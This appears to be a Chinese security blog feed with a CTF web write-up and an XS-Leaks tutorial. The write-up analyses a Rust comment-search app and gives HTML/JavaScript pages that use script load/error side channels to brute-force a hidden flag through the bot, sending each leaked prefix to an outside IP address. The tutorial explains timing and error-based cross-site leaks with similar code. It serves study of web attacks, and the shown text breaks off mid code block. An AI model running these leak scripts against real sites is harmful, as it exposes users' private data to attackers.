<span class="comment">// if !addr.ip().is_loopback() &#123;</span></span><br><span class="line">    <span class="comment">//     return Err(anyhow!(&quot;only bot can access&quot;).into());</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">true</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>/internal/search</code>是<code>private_search</code>，只允许bot访问。且此处的db::search的第三个参数为true，代表了允许搜索flag。</p><p>db.rs：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::&#123;fs, path::Path&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> r2d2::&#123;Pool, PooledConnection&#125;;</span><br><span class="line"><span class="keyword">use</span> r2d2_sqlite::SqliteConnectionManager;</span><br><span class="line"><span class="keyword">use</span> rusqlite::params;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">type</span> <span class="title class_">DbPool</span> = Pool&lt;SqliteConnectionManager&gt;;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">type</span> <span class="title class_">DbConn</span> = PooledConnection&lt;SqliteConnectionManager&gt;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">init</span>(db_name: <span class="type">String</span>, json_name: <span class="type">String</span>, flag: <span class="type">String</span>) <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;DbPool&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> Path::<span class="title function_ invoke__">new</span>(&amp;db_name).<span class="title function_ invoke__">exists</span>() &#123;</span><br><span class="line">        fs::<span class="title function_ invoke__">remove_file</span>(&amp;db_name)?;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">manager</span> = SqliteConnectionManager::<span class="title function_ invoke__">file</span>(db_name);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = Pool::<span class="title function_ invoke__">new</span>(manager)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">content</span> = fs::<span class="title function_ invoke__">read_to_string</span>(json_name)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span>: <span class="type">Vec</span>&lt;<span class="type">String</span>&gt; = serde_json::<span class="title function_ invoke__">from_str</span>(&amp;content)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">        <span class="string">&quot;CREATE TABLE comments(content TEXT, hidden BOOLEAN)&quot;</span>,</span><br><span class="line">        params![],</span><br><span class="line">    )?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">comment</span> <span class="keyword">in</span> comments &#123;</span><br><span class="line">        conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">            <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">            params![comment, <span class="literal">false</span>],</span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">        <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">        params![flag, <span class="literal">true</span>],</span><br><span class="line">    )?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(pool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">search</span>(conn: DbConn, query: <span class="type">String</span>, hidden: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stmt</span> =</span><br><span class="line">        conn.<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM comments WHERE content LIKE ? AND hidden = ?&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = stmt</span><br><span class="line">        .<span class="title function_ invoke__">query_map</span>(params![<span class="built_in">format!</span>(<span class="string">&quot;%&#123;&#125;%&quot;</span>, query), hidden], |row| &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(row.<span class="title function_ invoke__">get</span>(<span class="number">0</span>)?)</span><br><span class="line">        &#125;)?</span><br><span class="line">        .collect::&lt;rusqlite::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;&gt;()?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(comments)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么我们目前的思路就是让bot去访问&#x2F;internal&#x2F;search来获取flag。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">true</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果能搜索到comments，那么就返回200，否则返回Err错误。他并没有回显，只是返回一种状态。</p><p>这道题的重点其实就在于此！XS-Leaks有一种基于错误的攻击。<a href="https://blog.csdn.net/allway2/article/details/126703565">https://blog.csdn.net/allway2/article/details/126703565</a></p><p>且我们看到这里的<code>db::search</code>实现的是一种模糊查询，可以使用这种方法！</p><p>我们用基本的poc试试：此时是需要用到csrf的，在&#x2F;report路由中给让bot去访问我们构造的恶意html，再以bot的身份去进行相关行为。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Error-Based Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">checkError</span>(<span class="params">url</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        script.<span class="property">src</span> = url</span></span><br><span class="line"><span class="language-javascript">        script.<span class="property">onload</span> = <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://8.130.172.38:8000/1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://8.130.172.38:8000/2&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">checkError</span>(<span class="string">&#x27;http://0.0.0.0:8000/internal/search?s=flag&#123;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">checkError</span>(<span class="string">&#x27;http://0.0.0.0:8000/internal/search?s=somethingwrong&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">checkError</span>(<span class="string">&#x27;http://0.0.0.0:8000/internal/search?s=nctf&#123;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">probeError</span>(<span class="params">flag</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> url = <span class="string">&#x27;http://127.0.0.1:8000/internal/search?s=&#x27;</span> + flag;</span><br><span class="line"><span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = url;</span><br><span class="line">script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://8.130.172.38:8000/?flag=&#x27;</span> + flag, &#123; <span class="attr">mode</span>:<span class="string">&#x27;no-cors&#x27;</span> &#125;);</span><br><span class="line"><span class="title function_">leak</span>(flag);</span><br><span class="line">script.<span class="title function_">remove</span>();</span><br><span class="line">&#125;;</span><br><span class="line">script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> script.<span class="title function_">remove</span>();</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> dicts = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">flag</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dicts.<span class="property">length</span>; i++) &#123;</span><br><span class="line"><span class="keyword">let</span> char = dicts[i];</span><br><span class="line"><span class="title function_">probeError</span>(flag + char);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">leak</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Error-Based Attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        let currentFlag = &quot;&quot;;</span><br><span class="line">        const chars = &quot;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        function sleep(ms) &#123;</span><br><span class="line">            return new Promise(resolve =&gt; setTimeout(resolve, ms));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function checkCharacter(char) &#123;</span><br><span class="line">            return new Promise((resolve) =&gt; &#123;</span><br><span class="line">                let script = document.createElement(&#x27;script&#x27;);</span><br><span class="line">                script.src = `http://0.0.0.0:8000/internal/search?s=$&#123;currentFlag&#125;$&#123;char&#125;`;</span><br><span class="line"></span><br><span class="line">                script.onload = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(true);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                script.onerror = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(false);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                document.head.appendChild(script);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        async function bruteforce() &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                while (!currentFlag.endsWith(&#x27;&#125;&#x27;)) &#123;</span><br><span class="line">                    for (let char of chars) &#123;</span><br><span class="line">                        const isCorrect = await checkCharacter(char);</span><br><span class="line">                        if (isCorrect) &#123;</span><br><span class="line">                            currentFlag += char;</span><br><span class="line">                            window.open(`http://8.130.172.38:8000/?flag=$&#123;currentFlag&#125;`);</span><br><span class="line">                            await sleep(50);</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                        await sleep(50);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                window.open(`http://8.130.172.38:8000/?error=$&#123;currentFlag&#125;`);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bruteforce();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XS-Leaks学习</title>
      <link href="/2025/04/07/XS-Leaks%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/04/07/XS-Leaks%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>XS-Leaks 全称 Cross-site leaks，可以用来 <strong>探测用户敏感信息</strong>。</p><p>设想网站存在一个模糊查找功能（若前缀匹配则返回对应结果）例如 <code>http://localhost/search?query=</code>，页面是存在 xss 漏洞，并且有一个类似 flag 的字符串，并且只有不同用户查询的结果集不同。这时你可能会尝试 csrf，但是由于网站正确配置了 CORS，导致无法通过 xss 结合 csrf 获取到具体的响应。这个时候就可以尝试 XS-Leaks。</p><p>XS-Leaks（或 Cross-Site Leaks）是一<a href="https://xsleaks.dev/">组浏览器侧通道攻击</a>。它们使恶意网站能够从其他 Web 应用程序的用户那里推断数据。盲注也是一种侧信道攻击，可以这么理解。</p><p>在此之前，我们需要先了解一下同源政策，正是因为它的存在，XS-Leaks才有出现的必要。</p><h2 id="同源政策"><a href="#同源政策" class="headerlink" title="同源政策"></a>同源政策</h2><p><a href="https://medium.com/starbugs/%E5%BC%84%E6%87%82%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96-same-origin-policy-%E8%88%87%E8%B7%A8%E7%B6%B2%E5%9F%9F-cors-e2e5c1a53a19">https://medium.com/starbugs/%E5%BC%84%E6%87%82%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96-same-origin-policy-%E8%88%87%E8%B7%A8%E7%B6%B2%E5%9F%9F-cors-e2e5c1a53a19</a></p><p>在开始之前，了解 SOP（Same Origin Policy）是很有帮助的，它是 Web 浏览器安全模型的核心和灵魂。这是一个或多或少说的规则：</p><p>同源政策是网站安全的基础。<a href="https://domain-a.com/">https://domain-a.com</a>只能访问自己网站里的资源（图片、视频、节目码等），不允许网站<a href="https://domain-b.com/">https://domain-b.com</a>来访问。想要访问跨源资源必须在某些特定情况下才被允许。</p><p>允许scheme、domain、port都可以被视为同源 (same-origin)</p><blockquote><p>若以 <a href="https://domain-a.com:80/hannah-lin">https://domain-a.com:80/hannah-lin</a> 做范例，我们可以据此判断下列是否为同源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://domain-a.com → 不同源．scheme 不同</span><br><span class="line">https://domain-a.com/mike → 同源</span><br><span class="line">https://news.domain-a.com → 不同源．domain 不同</span><br><span class="line">https://domain-a.com:81 → 不同源．port 不同</span><br><span class="line">https://domain-b.com → 不同源．domain 不同</span><br></pre></td></tr></table></figure></blockquote><p>但是很多情况下网站明明就引入了很多跨来源的资源啊？</p><p>没错，在某些情况下跨来源是被允许的，不受同源限制策略！</p><ul><li><strong>跨来源嵌入通常被允许 ( embed )</strong></li></ul><p>像示例的<code>&lt;script src=”…”&gt;&lt;/script&gt;</code>、<code>&lt;link rel=”stylesheet” href=”…”&gt;</code>、<code>&lt;iframe&gt;</code>、图片<code>&lt;img&gt;</code>、<code>&lt;video&gt;</code>、 或者<code>@font-face</code> <code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code>.等等都是跨来源嵌入。</p><ul><li><strong>跨来源写入通常被允许 ( writes )</strong></li></ul><p>可以在以太网上由<code>&lt;form&gt;</code>在<code>domain-a.com</code>发请求给<code>domain-b.com</code>，当然利用链接链接或直接重定向到其他网站也是允许的。</p><ul><li><strong>跨源读取通常被禁止 ( reads )</strong></li></ul><p><code>domain-a.com</code>无法读取<code>domain-b.com</code>cookie、XMLHttpRequest ，Fetch API 也无法被读取，会返回错误</p><p><img src="https://miro.medium.com/v2/resize:fit:875/1*BTtIADAmDXDACtlP0MkD4g.png" alt="img"></p><h2 id="通过定时攻击泄露"><a href="#通过定时攻击泄露" class="headerlink" title="通过定时攻击泄露"></a>通过定时攻击泄露</h2><p>浏览器可以轻松地对跨域请求进行计时。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> start = performance.<span class="title function_">now</span>()</span><br><span class="line"> </span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> time = performance.<span class="title function_">now</span>() - start</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;The request took %d ms.&#x27;</span>, time)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">#<span class="title class_">The</span> request took <span class="number">129</span> ms.</span><br></pre></td></tr></table></figure><p>这使得恶意网站可以区分响应。假设有一个搜索 API 供患者查找自己的记录。如果患者患有糖尿病并搜索“糖尿病”，则服务器返回数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/v1/records/search?query=diabetes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#x27;records&#x27;: [&#123; &#x27;id&#x27;: 1, ... &#125;] &#125;</span><br></pre></td></tr></table></figure><p>如果患者没有糖尿病，API 会返回一个空的 JSON。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/v1/records/search?query=diabetes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#x27;records&#x27;: [] &#125;</span><br></pre></td></tr></table></figure><p>一般来说，前一个请求需要更长的时间。然后，攻击者可以创建一个恶意网站，对“diabetes” URL 的请求进行计时，并确定用户是否患有糖尿病。</p><h2 id="通过基于错误的攻击"><a href="#通过基于错误的攻击" class="headerlink" title="通过基于错误的攻击"></a>通过基于错误的攻击</h2><p>我们列表中的下一个侧通道是使用 JavaScript 策略性地捕获错误消息。假设一个页面根据一些敏感的用户数据返回<code>200 OK</code>或。<code>404 not found</code></p><p>然后，攻击者可以创建如下所示的页面，该页面查询应用程序并确定端点是否为浏览器用户返回错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkError</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">  script.<span class="property">src</span> = url</span><br><span class="line">  script.<span class="property">onload</span> = <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] GET <span class="subst">$&#123;url&#125;</span> succeeded.`</span>)</span><br><span class="line">  script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[-] GET <span class="subst">$&#123;url&#125;</span> returned error.`</span>)</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">checkError</span>(<span class="string">&#x27;https://www.example.com/&#x27;</span>)</span><br><span class="line"><span class="title function_">checkError</span>(<span class="string">&#x27;https://www.example.com/this-does-not-exist&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] GET https://www.example.com/ succeeded.</span><br><span class="line">[+] GET https://www.example.com/this-does-not-exist returned error.</span><br></pre></td></tr></table></figure><p>个人认为这跟布尔盲注很像！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Error-Based Attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    function checkError(url) &#123;</span><br><span class="line">        let script = document.createElement(&#x27;script&#x27;)</span><br><span class="line">        script.src = url</span><br><span class="line">        script.onload = () =&gt; window.open(&quot;http://101.43.48.199:8000/1&quot;);</span><br><span class="line">        script.onerror = () =&gt; window.open(&quot;http://101.43.48.199:8000/2&quot;);</span><br><span class="line">        document.head.appendChild(script)</span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      checkError(&#x27;http://0.0.0.0:8000/internal/search?s=nctf&#123;&#x27;)</span><br><span class="line">      checkError(&#x27;http://0.0.0.0:8000/internal/search?s=somethingwrong&#x27;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来给出一个相关exp：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 